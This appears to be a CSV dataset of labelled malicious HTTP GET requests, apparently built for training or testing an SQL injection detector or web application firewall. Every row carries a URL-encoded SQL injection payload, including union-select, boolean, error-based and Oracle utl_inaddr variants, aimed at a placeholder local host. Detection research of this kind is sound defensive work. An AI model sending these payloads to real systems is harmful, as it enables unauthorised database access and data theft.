"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_000035","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2718%22+or+2724+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%282724%3D2724%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29+and+%22xwbf%22%3D%22xwbf","/","p=-2718%22+or+2724+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%282724%3D2724%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29+and+%22xwbf%22%3D%22xwbf","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2718%22+or+2724+in+%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%282724%3D2724%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29+and+%22xwbf%22%3D%22xwbf HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000036","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2761+or+1144%3D7657--+mfml","/","p=-2761+or+1144%3D7657--+mfml","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2761+or+1144%3D7657--+mfml HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000037","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2793%27%29+where+2621%3D2621+union+all+select+2621%23","/","p=-2793%27%29+where+2621%3D2621+union+all+select+2621%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2793%27%29+where+2621%3D2621+union+all+select+2621%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000038","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2817%25%27%29+or+8255%3D3841--","/","p=-2817%25%27%29+or+8255%3D3841--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2817%25%27%29+or+8255%3D3841-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000039","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-2912%27%29%29+order+by+1--","/","p=-2912%27%29%29+order+by+1--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-2912%27%29%29+order+by+1-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000040","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3037%29+where+9024%3D9024+union+all+select+9024%2C9024--","/","p=-3037%29+where+9024%3D9024+union+all+select+9024%2C9024--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3037%29+where+9024%3D9024+union+all+select+9024%2C9024-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000041","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3102%29+union+all+select+6707%2C6707%2C6707%2C6707--","/","p=-3102%29+union+all+select+6707%2C6707%2C6707%2C6707--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3102%29+union+all+select+6707%2C6707%2C6707%2C6707-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000042","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3126%29%29+union+all+select+6718%2C6718%2C6718%2C6718%2C6718--","/","p=-3126%29%29+union+all+select+6718%2C6718%2C6718%2C6718%2C6718--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3126%29%29+union+all+select+6718%2C6718%2C6718%2C6718%2C6718-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000043","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3194%22%29%29%29+or+4493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284493%3D4493%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+and+%28%28%28%22erua%22%3D%22erua","/","p=-3194%22%29%29%29+or+4493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284493%3D4493%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+and+%28%28%28%22erua%22%3D%22erua","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3194%22%29%29%29+or+4493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284493%3D4493%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+and+%28%28%28%22erua%22%3D%22erua HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000044","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3211%29%29+as+fsej+where+6348%3D6348+or+9805%3D3783--","/","p=-3211%29%29+as+fsej+where+6348%3D6348+or+9805%3D3783--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3211%29%29+as+fsej+where+6348%3D6348+or+9805%3D3783-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000045","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3219%22%29+order+by+1--","/","p=-3219%22%29+order+by+1--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3219%22%29+order+by+1-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000046","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3347%25%22+or+9323%3D9323%23","/","p=-3347%25%22+or+9323%3D9323%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3347%25%22+or+9323%3D9323%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000047","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3347%27%2B%28select+xuzs+where+1076%3D1076+union+all+select+1076%2C1076%2C1076%2C1076%2C1076--","/","p=-3347%27%2B%28select+xuzs+where+1076%3D1076+union+all+select+1076%2C1076%2C1076%2C1076%2C1076--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3347%27%2B%28select+xuzs+where+1076%3D1076+union+all+select+1076%2C1076%2C1076%2C1076%2C1076-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000048","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3370%27+in+boolean+mode%29+union+all+select+3432%2C3432%2C3432%2C3432%23","/","p=-3370%27+in+boolean+mode%29+union+all+select+3432%2C3432%2C3432%2C3432%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3370%27+in+boolean+mode%29+union+all+select+3432%2C3432%2C3432%2C3432%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000049","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3379%29+union+all+select+4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985--","/","p=-3379%29+union+all+select+4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3379%29+union+all+select+4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985%2C4985-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000050","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3422%25%27%29+or+5903%3D%28%27qqpjq%27%7C%7C%28select+case+5903+when+5903+then+1+else+0+end+from+rdb%24database%29%7C%7C%27qzvzq%27%29+and+%28%27%25%27%3D%27","/","p=-3422%25%27%29+or+5903%3D%28%27qqpjq%27%7C%7C%28select+case+5903+when+5903+then+1+else+0+end+from+rdb%24database%29%7C%7C%27qzvzq%27%29+and+%28%27%25%27%3D%27","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3422%25%27%29+or+5903%3D%28%27qqpjq%27%7C%7C%28select+case+5903+when+5903+then+1+else+0+end+from+rdb%24database%29%7C%7C%27qzvzq%27%29+and+%28%27%25%27%3D%27 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000051","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3443%22%29%29+union+all+select+4043%2C4043%2C4043%2C4043%2C4043%2C4043%2C4043%23","/","p=-3443%22%29%29+union+all+select+4043%2C4043%2C4043%2C4043%2C4043%2C4043%2C4043%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3443%22%29%29+union+all+select+4043%2C4043%2C4043%2C4043%2C4043%2C4043%2C4043%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000052","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3505%22%29+or+5290%3D3436--","/","p=-3505%22%29+or+5290%3D3436--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3505%22%29+or+5290%3D3436-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000053","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3667%25%27%29%29+union+all+select+3560%2C3560%2C3560--","/","p=-3667%25%27%29%29+union+all+select+3560%2C3560%2C3560--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3667%25%27%29%29+union+all+select+3560%2C3560%2C3560-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000054","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3737%25%22+union+all+select+4452%2C4452%2C4452%23","/","p=-3737%25%22+union+all+select+4452%2C4452%2C4452%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3737%25%22+union+all+select+4452%2C4452%2C4452%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000055","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3829%25%22%29+union+all+select+2218%2C2218%2C2218%2C2218%2C2218%2C2218%2C2218--","/","p=-3829%25%22%29+union+all+select+2218%2C2218%2C2218%2C2218%2C2218%2C2218%2C2218--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3829%25%22%29+union+all+select+2218%2C2218%2C2218%2C2218%2C2218%2C2218%2C2218-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000056","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3862%27%29+or+9323%3D9323%23","/","p=-3862%27%29+or+9323%3D9323%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3862%27%29+or+9323%3D9323%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000057","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3873%25%27%29%29+or+1+group+by+concat%280x7171706a71%2C%28select+%28case+when+%284232%3D4232%29+then+1+else+0+end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29+having+min%280%29%23","/","p=-3873%25%27%29%29+or+1+group+by+concat%280x7171706a71%2C%28select+%28case+when+%284232%3D4232%29+then+1+else+0+end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29+having+min%280%29%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3873%25%27%29%29+or+1+group+by+concat%280x7171706a71%2C%28select+%28case+when+%284232%3D4232%29+then+1+else+0+end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29+having+min%280%29%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000058","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3879%27+union+all+select+9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814--","/","p=-3879%27+union+all+select+9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3879%27+union+all+select+9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814%2C9814-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000059","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3956%27%29+or+%288459%3D8459%29%2A4906+and+%28%27rflo%27+like+%27rflo","/","p=-3956%27%29+or+%288459%3D8459%29%2A4906+and+%28%27rflo%27+like+%27rflo","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3956%27%29+or+%288459%3D8459%29%2A4906+and+%28%27rflo%27+like+%27rflo HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000060","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3963%22+or+1224%3D5119","/","p=-3963%22+or+1224%3D5119","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3963%22+or+1224%3D5119 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000061","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3971%25%27%29%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%28%27%25%27%3D%27","/","p=-3971%25%27%29%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%28%27%25%27%3D%27","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3971%25%27%29%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%28%27%25%27%3D%27 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000062","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-3978+or+4144%3D%28select+upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284144%3D4144%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29+from+dual%29--+mtun","/","p=-3978+or+4144%3D%28select+upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284144%3D4144%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29+from+dual%29--+mtun","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-3978+or+4144%3D%28select+upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284144%3D4144%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29+from+dual%29--+mtun HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000063","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-4023+or+%288779%3D5716%29%2A5716","/","p=-4023+or+%288779%3D5716%29%2A5716","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-4023+or+%288779%3D5716%29%2A5716 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000064","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-4025%22+or+3038%3D3038","/","p=-4025%22+or+3038%3D3038","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-4025%22+or+3038%3D3038 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000065","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-4044%25%22+or+4493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284493%3D4493%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+and+%22%25%22%3D%22","/","p=-4044%25%22+or+4493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284493%3D4493%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+and+%22%25%22%3D%22","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-4044%25%22+or+4493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%284493%3D4493%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+and+%22%25%22%3D%22 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000066","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-4055%27%29%29+as+yoez+where+3816%3D3816+or+%288459%3D8459%29%2A4906--","/","p=-4055%27%29%29+as+yoez+where+3816%3D3816+or+%288459%3D8459%29%2A4906--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-4055%27%29%29+as+yoez+where+3816%3D3816+or+%288459%3D8459%29%2A4906-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000067","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-4091%29%29+as+lqqy+where+3030%3D3030+union+all+select+3030%2C3030%2C3030%23","/","p=-4091%29%29+as+lqqy+where+3030%3D3030+union+all+select+3030%2C3030%2C3030%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-4091%29%29+as+lqqy+where+3030%3D3030+union+all+select+3030%2C3030%2C3030%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000068","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-4108%27%29+or+3440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%283440%3D3440%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29+and+%28%27tqjx%27%3D%27tqjx","/","p=-4108%27%29+or+3440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%283440%3D3440%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29+and+%28%27tqjx%27%3D%27tqjx","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-4108%27%29+or+3440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select+%28case+when+%283440%3D3440%29+then+1+else+0+end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29+as+numeric%29+and+%28%27tqjx%27%3D%27tqjx HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
